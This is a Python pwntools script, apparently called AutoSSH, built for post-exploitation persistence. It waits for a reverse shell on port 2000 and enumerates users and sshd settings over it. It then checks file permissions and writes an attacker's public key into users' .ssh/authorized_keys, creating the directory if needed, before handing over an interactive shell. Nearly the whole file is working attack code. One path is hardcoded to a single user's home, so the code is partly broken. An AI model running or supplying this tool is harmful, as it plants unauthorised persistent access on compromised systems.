import os 
import socket
import sys
import time 
from pwn import *  

# context.log_level = "DEBUG"

class Perm():
    def __init__(self,Perm):
        self.Perms = Perm
        self.OwnerPerms = Perm[0:2]
        self.GroupPerms = Perm[2:5]
        self.GenericPerms = Perm[5:8]
        self.SetNumPerms()
        
    def __repr__(self):
        return(self.NumPerm)
        
    def SetNumPerms(self):
        'Function to Set Number Permission from rwx permissions'
        s = self.Perms.replace("-","0").replace("r","4").replace("w","2").replace("x","1")
        sx = "".join(list(map(str,map(sum,[(map(int,list(s[i:i+3]))) for i in range(0,len(s),3)]))))
        # * Janky one liner to get int permissions
        self.NumPerm = sx

class Item():
    def __init__(self,Perms,Owner,Group,FileSize,Name):
        self.Type = "Directory" if Perms[0] == "d" else "File"
        self.Perms = Perm(Perms[1:])
        self.Owner = Owner
        self.Group = Group
        self.fs = FileSize 
        self.Name = Name
        
    def __repr__(self):
        return(vars(self))

class User():
    def __init__(self,Name,p,CurrentUser,Groups):
        self.Name = Name
        self.CurrentUser = CurrentUser
        self.Groups = Groups
        self.CanWriteToHomeDir = None
        self.p = p 
        self.SSH_Dir_Items = {}
        self.Home_Dir_Items = {}
        self.Has_SSH_Dir = self.CheckUser()
        self.EvaluateAccess()
        
    def CheckUser(self):
        'Check if a user has .ssh folder in home directory'
        L.sendline(f'[[ -d "/home/{self.Name}/.ssh/" ]] && echo "1" || echo "0"'.encode())
        L.recvline() # * Reply of Command 
        Has_SSh_Dir = bool(int(Sanitise(DefaultReply,L.recv(4048))))
        
        if Has_SSh_Dir:
            self.p.status(f".ssh Directory Found")
            self.CheckAccessRights()
        else:
            self.p.status(f".ssh Directory Not Found")
            
        return(Has_SSh_Dir)

        
    def CheckHomeDirWriteable(self):
        'Check if current user has permission to write to user\' home directory'
        SendLine(f"ls -la /home/{self.Name}/".encode())
        AccessRights = Sanitise(DefaultReply,L.recv(1024))
     
        for _ in AccessRights.split("\n")[1:]:
            x = _.split(" ")
            
            while "" in x:
                x.remove("")
                        
            if x[-1] == "..":
                pass
            
            I = Item(Perms=x[0],Owner=x[2],Group=x[3],FileSize=x[4],Name=x[-1])
            self.Home_Dir_Items.update({x[-1] : I})
        
        CanWrite = self.CanWrite(vars(self.Home_Dir_Items["."]),NameOverwrite=f"/home/{self.Name}")
        
        if CanWrite:
            self.p.status("'authorized_keys' can be created")
            
        self.CanWriteToHomeDir = CanWrite
            
     

    def CheckAccessRights(self):
        'Check Access Writes on contents within .ssh folder'
        SendLine(b"ls -la /home/NxtDaemon/.ssh")

        AccessRights = Sanitise(DefaultReply,L.recv(1024))
        
        for _ in AccessRights.split("\n")[1:]:
            x = _.split(" ")
            
            while "" in x:
                x.remove("")
                        
            if x[-1] == "..":
                pass
            I = Item(Perms=x[0],Owner=x[2],Group=x[3],FileSize=x[4],Name=x[-1])
            self.SSH_Dir_Items.update({x[-1] : I})
    
    def EvaluateAccess(self):
        'Evaluate whether ssh persistence is possible and action it'
        AuthKeys = self.SSH_Dir_Items.get("authorized_keys",False)
        
        if not AuthKeys:
            self.p.status("'authorized_keys' file doesn't exists")
            self.CheckHomeDirWriteable()
            if self.CanWriteToHomeDir:
                self.CreateSSHConfig()

        else:
            self.p.status("'authorized_keys' file exists")
            if self.CanWrite(vars(AuthKeys)):
                self.WriteKey()
    
    def WriteKey(self):
        'Write Key to authorized_keys file'
        Key = """HOST""" #! <--- Your SSH public key goes here
        
        SendLine(f"echo '{Key}' >> /home/{self.Name}/.ssh/authorized_keys".encode()) 
        L.clean(0.1)
        self.p.success(f"Added key to Hosts File")
    
    def CanWrite(self,File,NameOverwrite=""):
        'Check if current user can write to File/Folder FILE'
        WritePermInts = [7,6,3]
        Name = File.get("Name") if NameOverwrite == "" else NameOverwrite
        Perms = str(File.get("Perms"))
        Owner = File.get("Owner")
        Group = File.get("Group")
                        
        OwnerWritable = True if int(Perms[0]) in WritePermInts and (Owner == self.CurrentUser) else False
        GroupWritable = True if int(Perms[1]) in WritePermInts and Group in self.Groups else False
        WorldWriteable = True if int(Perms[2]) in WritePermInts else False
        
        if WorldWriteable:
            self.p.status(f"'{Name}' Is World Writeable")
            return(True)
        elif GroupWritable:
            self.p.status(f"'{Name}' is Writeable Via {Group}")
            return(True)
        elif OwnerWritable:
            self.p.status(f"'{Name}' is Owner Writeable")
            return(True)
        else:
            self.p.failure(f"'{Name}' Is Not Writeable.")
            return(False)
        
    def CreateSSHConfig(self):
        'Creates SSH config and authorized_keys file'
        SendLine(f"mkdir /home/{self.Name}/.ssh/".encode())
        SendLine(f"touch /home/{self.Name}/.ssh/authorized_keys".encode())
        self.p.status("Created '.ssh/' and 'authorized_keys'")
        self.WriteKey()
      
class SSH_Infomation():
    def __init__(self):
        SSH_Enabled = None
        SSH_Running = None
        self.Users = []
        self.Groups = []
        self.AllowList = []
        self.CurrentUser = "UNKNOWN"
        self.GetUser()
        self.GetGroups()
        self.AllowedUsers()
        self.StartupScript()
        self.CheckSSH()

    def StartupScript(self):
        'This function allows the user to run extra commands to execute before enumeration'

    def GetUser(self):
        'Function to get current user'
        SendLine(b"whoami") 
        Name = Sanitise(DefaultReply,L.recv(4096))
        self.CurrentUser = Name
        log.info(f"Current Logged On As : {Name}")

    def GetGroups(self):
        'Function to get groups of the current user'
        SendLine(b"groups")
        Groups = Sanitise(DefaultReply,L.recv(4096)).split(" ")
        self.Groups = Groups
        log.info(f"Current User Has Groups : {Groups}")
        
    def AllowedUsers(self):
        'Function to check for and get all allowed user within the SSHD config file'
        SendLine(b"grep 'AllowUsers' /etc/ssh/sshd_config ")
        Users = Sanitise(DefaultReply, L.recv().replace(b"AllowUsers",b""))
        if Users == "":
            self.AllowList = False
            log.info("SSHD Config Appears to NOT be using an AllowList.")
        else:
            self.AllowList = Users.split(" ")
            log.info(f"SSHD Config Appears to be using an AllowList, Users in AllowList -> {self.AllowList}")
            
    def CheckSSH(self):
        'Function to check whether SSHD is running on remote'
        SendLine(b"ps aux | grep sshd")
        Processes = Sanitise(DefaultReply,L.clean(0.15)).split("\n")
        log.info("")
        log.info("Displaying sshd Processes")
        for _ in Processes:
            log.info(f"    {_}")
            
        if len(Processes) >= 2:
            self.SSH_Running = True
            log.info("")
            log.info("Likelyhood of SSHD running seems high")
            self.GetUsers()
        else:
            X = None
            while X == None:
                try:
                    log.info("Likelyhood of SSHD running seems low")
                    Response = input("Do you want to attempt AutoSSh Anyway? [Y/N] > ").upper()
                    if not Response in ["Y","N"]:
                        raise("Not Correct Response")
                    X = True if Response == "Y" else False
                    
                    if X:
                        self.GetUsers()
                    
                except:
                    pass
            
    def GetUsers(self):
        'Function to enumerate all user\'s with a home directory.'
        SendLine(b"ls /home")
        Contents = Sanitise(DefaultReply,L.recv(4096))
        Users = Contents.split("\n")
        
        for _ in Users:
            log.info("")
            log.info(f"Found User : {_}")
            p = log.progress(f"{_}")
            UserF = User(_,p,self.CurrentUser,self.Groups)
            self.Users.append(UserF)
            
        return Users

def SendLine(Content):
    'Function to sendline and recover intial command response'
    L.sendline(Content)
    L.recv(1024)
 
def Sanitise(DefaultReply,String : str):
    'Function to sanitise and handle output and remove DefaultReply'
    if isinstance(String, bytes):
        String = String.decode()    
    
    String = String.strip().replace(DefaultReply,"")
    return String.strip()


# * Setup Listener Shell
L = listen(2000)
print(f"Listening On 0.0.0.0:{L.lport}")
DefaultReply = L.recv(1024).decode().strip()
X = SSH_Infomation()

try:
    Choice = input("Do you want to go interactive? (Enter anything to go interactive or ctrl-c to exit) > ")
    L.interactive()
except KeyboardInterrupt:
    print("\n")
    exit()

